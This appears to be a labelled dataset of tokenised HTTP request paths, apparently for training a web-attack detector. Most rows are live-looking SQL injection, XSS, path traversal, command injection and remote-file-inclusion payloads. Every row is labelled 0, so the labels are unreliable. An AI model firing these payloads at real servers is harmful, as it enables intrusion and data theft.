sentences 	 labels
/ main . php ? logout =  '  \ x0auname  > q64819443  #  \r\n\r\n 	 0
/ cgi-bin / apexec . pl ? etype = odp & template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html & passurl =  / category /  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo eekjde )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  \r\n\r\n 	 0
/ javascript / chrome . exe  \r\n\r\n 	 0
/ quagynka . x ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ javascript / esales . exe  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  as tecq where 4817 = 4817 and 8189 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  \r\n\r\n 	 0
/ string / strings / parameters = < marquee loop = 1 width = 0 onfinish = confirm ( 1 )  > 0 <  / marquee >  \r\n\r\n 	 0
/ string / str =  $  ( echo tikhvb )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  \r\n\r\n 	 0
/ scripts / sendcard . php ? view = 1 & id =  ' sendcard_sql . nasl  \r\n\r\n 	 0
/ string / strings / parameters = 1 or  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8113 = 8113 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  --  viti  \r\n\r\n 	 0
/ en-us / s7qus4g3 . pl ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  ,  ( select  *  from generate_series ( 5609 , 5609 , case when  ( 5609 = 5609 )  then 1 else 0 end )  limit 1 )  \r\n\r\n 	 0
/ string / strings / parameters = echo lbgscb $  (  ( 75 + 53 )  )  $  ( echo lbgscb ) lbgscb &  \r\n\r\n 	 0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fagbbn )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  |  \r\n\r\n 	 0
/ read / search / results ? words = nessus "  >  < script > alert (  ' listmanager_words_xss . nasl '  )  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  \r\n\r\n 	 0
/ scripts / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331908691 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00  \r\n\r\n 	 0
/ string / strings / parameters = |   [  6 -ne  $  ( echo tkxzex  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  \r\n\r\n 	 0
/ string / str =  $  ( echo ycsciw )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  \r\n\r\n 	 0
/ scripts / index . php ? p =  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ boot . ini \ x00  \r\n\r\n 	 0
/ help . php ? q =  " del \ x09q83132484 & rem \ x09  \r\n\r\n 	 0
/ scripts / news . scr . php ? globals [ pth ]  [ classes ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  ?  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  "  "  or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  "  "  %  "  "  =  "  "  \r\n\r\n 	 0
/ help . php ? q = ping ; -w ; 8000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ;  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  ,  ( select  ( case when  ( 6560 = 2813 )  then 1 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual )  \r\n\r\n 	 0
/ string / strings / parameters = & echo $ ifsutudjc $  (  ( 16 + 78 )  )  $  ( echo $ ifsutudjc ) utudjc /  /  \r\n\r\n 	 0
/  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  .  /  { file }  \r\n\r\n 	 0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo kigxdw )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  &  \r\n\r\n 	 0
/ files / message-forward . php3 ? bsx_libdir = xxpathxx  \r\n\r\n 	 0
/ en-us / account / backend / classes . php ? include_path =  .  .  / lib / jinzora . js \ x00  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  )  union all select null , null --  \r\n\r\n 	 0
/ cgi-bin / quickstore . cgi ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00html & cart_id =  \r\n\r\n 	 0
/ popup . php ? poll_ident =  < script > alert (  " wvs-xss-magic-string-411445575285 "  )  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = &  # 34 ;  &  # 62 ;  < h1 / onmouseover =  '  \ u0061lert ( 1 )  '  >  \r\n\r\n 	 0
/ string / strings / parameters = -3794 '  )  union all select 2485 , 2485 , 2485 , 2485 , 2485 --  \r\n\r\n 	 0
/ string / strings / parameters = |   [  9 -ne  $  ( echo nykvkx  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  \r\n\r\n 	 0
/ weq93ppb . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  "  "  )  )  or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  --  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  as nwyh where 7100 = 7100 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  \r\n\r\n 	 0
/ usr / extensions / get_calendar . inc . php ? root_path = xxpathxx  \r\n\r\n 	 0
/ cgis / pfdispaly . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ zuihld5m . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = -4557 or 6872 = 6872 --  kkte  \r\n\r\n 	 0
/ en-us / hipkz026 . idc ?  < script > document . cookie =  " testyrbs = 2855 ;  "  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  as gdcx where 2335 = 2335 and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  --  \r\n\r\n 	 0
/ javascript / pm . exe  \r\n\r\n 	 0
/ help . php ? q =  ; rm \ x09q81281166 \ x09 #  \r\n\r\n 	 0
/ string / strings / parameters = < script src =  " http :  &  # 47 ;  &  # 47 ; xss . rocks / xss . jpg "  >  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  and 7366 = 9197 #  \r\n\r\n 	 0
/ rpxyx07v . asp ?  < script > document . cookie =  " testbnli = 1975 ;  "  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  )  )  ; begin user_lock . sleep ( 5 )  ;  end and  (  (  '  %  '  =  '  \r\n\r\n 	 0
/ phpmyadmin / webappmon . exe ? ins = nowait & act = natping & sel =  " 255 . 255 . 255 . 255  &  id &  "  \r\n\r\n 	 0
/ index . php / 1 '  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  ( 5099 = 5099  \r\n\r\n 	 0
/ edv3mapy . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ r3le3om5 . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = -1059 "  "  )  union all select 1276 , 1276 , 1276 , 1276 , 1276 , 1276 , 1276 , 1276 #  \r\n\r\n 	 0
/ d7ktpmcq . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ examples / jsp / colors / search . php ? allwords =  < br >  < script > foo <  / script >  & cid = 0 & title = 1 & desc = 1  \r\n\r\n 	 0
/ phpmyadmin / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1358744507 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  \r\n\r\n 	 0
/ string / strings / parameters = % oa ping -n 30 127 . 0 . 0 . 1  \r\n\r\n 	 0
/ oie504mr . dll ?  < script > document . cookie =  " testtpby = 7052 ;  "  <  / script >  \r\n\r\n 	 0
/ help . php ? q =  "  & rm \ xa0q59981564 & rem \ xa0  \r\n\r\n 	 0
/ string / strings / parameters = -4108 '  )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  ' tqjx '  =  ' tqjx  \r\n\r\n 	 0
/ string / strings / parameters = |   [  9 -ne  $  ( echo wxfpfo  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  )  ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 and  (  (  (  ' ctbs '  like  ' ctbs  \r\n\r\n 	 0
/ phpmyadmin / documentation . html ? phpmyadmin =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  )  ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 and  (  '  %  '  =  '  \r\n\r\n 	 0
/ 5qnlm5z2 . jsp ?  < meta http-equiv = set-cookie content =  " testsixi = 8451 "  >  \r\n\r\n 	 0
/ string / strings / parameters = select  *  from information_schema . tables --  \r\n\r\n 	 0
/ string / modo = insertar & precio = 1885 +  & b1 = pasar + por + caja  \r\n\r\n 	 0
/ string / strings / parameters = '   str =  $  ( echo giprgx )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  \r\n\r\n 	 0
/ forum1_professionnel . asp ? n = 1771 & amp ; nn = 100 & amp ; page = c :  \ boot . ini  \r\n\r\n 	 0
/ main . php ? logout =  '  \ x0arm \ x09q55586739 \ x09 #  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  as kuuf where 6908 = 6908 ; if ( 7899 = 7899 )  select 7899 else drop function zbbp --  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  as krzi where 8727 = 8727 or 8315 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  \r\n\r\n 	 0
/ string / strings / parameters = |  | echo ovbfoe $  (  ( 46 + 36 )  )  $  ( echo ovbfoe ) ovbfoe &  \r\n\r\n 	 0
/ string / strings / parameters = "  | echo $ ifsytbsts $  (  ( 24 + 38 )  )  $  ( echo $ ifsytbsts ) ytbsts |  \r\n\r\n 	 0
/ string / modoa = registro & login = puglia & password = ente + 6a7 & nombre = serveriana & apellidos = santander + bohorquez & email = rundle4 @ eurograb . ma & dni = 09116322l & direccion = calle + trebedes + 157 ,  +  & ciudad = fasnia & cp = 02270 & provincia = ciudad + real & ntc = 1078977887269273 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo msptmx )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \r\n\r\n 	 0
/ string / modo = entrar & login = rocio4 & pwd = acrecenta ! dora & remember = onany ?   set-cookie :  + tamper = 1041264011025374727 & b1 = entrar  \r\n\r\n 	 0
/ javascript /  . passwd . o  \r\n\r\n 	 0
/ string / strings / parameters = 1 ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  #  huhw  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  |  |  ( select  ' kbvq '  where 9279 = 9279 and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  )  |  |  '  \r\n\r\n 	 0
/ string / strings / parameters = &  & echo ncexjg $  (  ( 72 + 12 )  )  $  ( echo ncexjg ) ncexjg /  /  \r\n\r\n 	 0
/ string / strings / parameters = ; echo $ ifsxltpvn $  (  ( 45 + 86 )  )  $  ( echo $ ifsxltpvn ) xltpvn \  \r\n\r\n 	 0
/ examples / jsp / checkbox / index . php ? cat_select =  < script > foo <  / script >  \r\n\r\n 	 0
/ javascript / 2004 . exe  \r\n\r\n 	 0
/ string / strings / parameters = -6095 '  )  or 6872 = 6872 and  (  ' bfwm '  like  ' bfwm  \r\n\r\n 	 0
/ string / strings / parameters = & lt ; script src =  /  / xss . rocks /  . j >  \r\n\r\n 	 0
/ string / strings / parameters = < svg onclick = popup = 1 ;  >  \r\n\r\n 	 0
/ string / strings / parameters = '   str =  $  ( echo jkjfeg )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  \r\n\r\n 	 0
/ string / strings / parameters = '   str =  $  ( echo paacld )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  \r\n\r\n 	 0
/ children ' s /  \r\n\r\n 	 0
/ string / strings / parameters = |  | echo ihelyg $  (  ( 76 + 62 )  )  $  ( echo ihelyg ) ihelyg &  \r\n\r\n 	 0
/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 6f + 61 + 64 + 4c + 69 + 62 + 72 + 61 + 72 + 79 + 41 + 00 + 00 + 00 + 00 + 47 + 65 + 74 + 50 + 72 + 6f + 63 + 41 + 64 + 64 +  +  >  > ctdn  \r\n\r\n 	 0
/ javascript / sessions . exe  \r\n\r\n 	 0
/ scripts / mlog . html ? screen =  / etc / passwd  \r\n\r\n 	 0
/ 7u1pb2xi . nsf ?  < script > document . cookie =  " testlwwz = 718 ;  "  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo hdixth )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  order by 1 --  \r\n\r\n 	 0
/ cgi-bin / contrib / forms / evaluation / c_formevaluation . class . php ? fileroot =  / etc / passwd \ x00  \r\n\r\n 	 0
/ bl8sefdm . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ main . php ? stuff =  "  & ver \ x09 > q95961944 & rem \ x09  \r\n\r\n 	 0
/ string / strings / parameters = '  waitfor delay  ' 0 : 0 : 20 '   --  \r\n\r\n 	 0
/ string / strings / parameters = '  ) print (  ` echo ehpkwp \ necho  $  (  ( 79 + 86 )  )  \ necho ehpkwp \ necho ehpkwp `  )  ;  /  / ehpkwp  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  where 8672 = 8672 union all select null , null #  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  as jiiq where 6847 = 6847 ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 --  \r\n\r\n 	 0
/ scripts / kernel / loadkernel . php ? installpath =  / etc / passwd \ x00  \r\n\r\n 	 0
/ javascript / surf . exe  \r\n\r\n 	 0
/ string / strings / parameters = '  or  ' 1 '  =  ' 1 '  --  \r\n\r\n 	 0
/ support / include / open_form . php ? include_dir = xxpathxx ? cmd = pwd  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  where 1272 = 1272 or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  --  \r\n\r\n 	 0
/ string / modo = registro & login = fitch & password = libres29 & nombre = aramis & apellidos = bellmunt + callealt & email = frigola @ lesionesmusculares . tv +  & dni = 56967582d & direccion = plza .  + celso + negueruela ,  + 113 ,  +  & ciudad = pajares + de + los + oteros & cp = 18370 & provincia = lava & ntc = 6708069843609931 & b1 = registrar  \r\n\r\n 	 0
/ fcgi-bin / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ string / strings / parameters = "  echo bzqfls $  (  ( 30 + 41 )  )  $  ( echo bzqfls ) bzqfls "  \r\n\r\n 	 0
/ string / strings / parameters = '  ;  str =  $  ( echo zepyms )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \r\n\r\n 	 0
/ e9rx3ya4 . x ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ xoops232b / htdocs / xoops_lib / modules / protector / onupdate . php ? mydirname = a (  )  {  } system (  '  /  .  / tmp / rymojltfjq0 +  >  +  / dev / null +  &  '  )  ;  function v  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  "  "  waitfor delay  ' 0 : 0 : 5 '  --  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  "  "  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  "  "  %  "  "  =  "  "  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  '  )  )  )  and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  '  %  '  =  '  \r\n\r\n 	 0
/ index . php ? errcode =  < script > alert (  " 413375588092 "  )  ;  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  +  ( select pagd where 2484 = 2484 ; select  ( case when  ( 3855 = 3855 )  then 3855 else 1 /  ( select 0 )  end )  --  \r\n\r\n 	 0
/ ssi / envout . bat ?  | dir  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  \r\n\r\n 	 0
/ string / strings / parameters = ftp :  /  / 192 . 168 . 24 . 203 /  *  < apache_mod_proxy_ftp_glob_xss . nasl >  \r\n\r\n 	 0
/ help . php ? q =  '  \ x0adel q56533456  #  \r\n\r\n 	 0
/ gy23xnjq . jsp ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = <  !  >  <  !  --  --  >  <  ?  >  <  /  >  \r\n\r\n 	 0
/ top . php ? stuff =  '  ; uname  > q56884429  #  \r\n\r\n 	 0
/ string / modo = registro & login = dongmoon & password = setentavo & nombre = naiara & apellidos = ballester + alumbreo & email = demjanenko @ gesautonomos . io & dni = 56050614m & direccion = c /  + colon + 123 ,  + 6 ? c & ciudad = cantalapiedra & cp = 43143 & provincia = lugo & ntca = 6967344603029050 & b1 = registrar  \r\n\r\n 	 0
/ plugins / spamx / editheader . admin . class . php ? _conf [ path ]  = xxpathxx  \r\n\r\n 	 0
/ recordings / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1161314398 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  \r\n\r\n 	 0
/ string / strings / parameters = |   [  2 -ne  $  ( echo oiyjxa  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  \r\n\r\n 	 0
/ examples / jsp / sessions / include / theme . inc . php ? fullpath =  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  )  and  ( 3020 = 3020 )  * 6703 and  (  (  (  "  " krxy "  "  =  "  " krxy  \r\n\r\n 	 0
/ i7prbs22 . php ?  < script > document . cookie =  " testjnre = 7328 ;  "  <  / script >  \r\n\r\n 	 0
/ cgi-bin / openview5 . exe ? target = main & action =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / windows / win . ini  \r\n\r\n 	 0
/ string / strings / parameters = echo ymgfhg $  (  ( 56 + 20 )  )  $  ( echo ymgfhg ) ymgfhg &  \r\n\r\n 	 0
/  % uff0e % uff0e \  % uff0e % uff0e \  { file }  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  --  \r\n\r\n 	 0
/ examples / jsp / cal / awstatstotals . php ? sort =  "  ]  . phpinfo (  )  . exit (  )  .  $ a [  "  \r\n\r\n 	 0
/ top . php ? stuff =  "  & rm q91375949 & rem  \r\n\r\n 	 0
/ string / strings / parameters = 1 where 6383 = 6383 or elt ( 6272 = 6272 , sleep ( 5 )  )  --  \r\n\r\n 	 0
/ main . php ? logout =  "  \ x0asleep \ x0911 \ x09 #  \r\n\r\n 	 0
/ accountlogon . cfm ? rtn = 1 "  >  < script > alert (  " 411735577546 "  )  ;  <  / script >  <  " 234  \r\n\r\n 	 0
/ main . php ? logout =  '  & uname  #  \r\n\r\n 	 0
/ string / modo = insertar & precio = 5289 & b1 = pasar + por + caja '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  \r\n\r\n 	 0
/ 9ko6m4c8 . cfc ?  < meta http-equiv = set-cookie content =  " testylik = 3403 "  >  \r\n\r\n 	 0
/ main . php ? logout =  '  \ x0auname \ x09 #  \r\n\r\n 	 0
/ scs86g1p . pl ?  < meta http-equiv = set-cookie content =  " testquyx = 2820 "  >  \r\n\r\n 	 0
/ examples / servlets / servlet / way-board / way-board . cgi ? db =  / etc / passwd \ x00  \r\n\r\n 	 0
/ examples / jsp / cal / index . php ? search =  < script > foo <  / script >  \r\n\r\n 	 0
/ examples / jsp / jsp2 / jspx / user . cgi ? url =  "  >  < script > alert (  " gossamer_links_url_xss . nasl "  )  ;  <  / script >  & from = add  \r\n\r\n 	 0
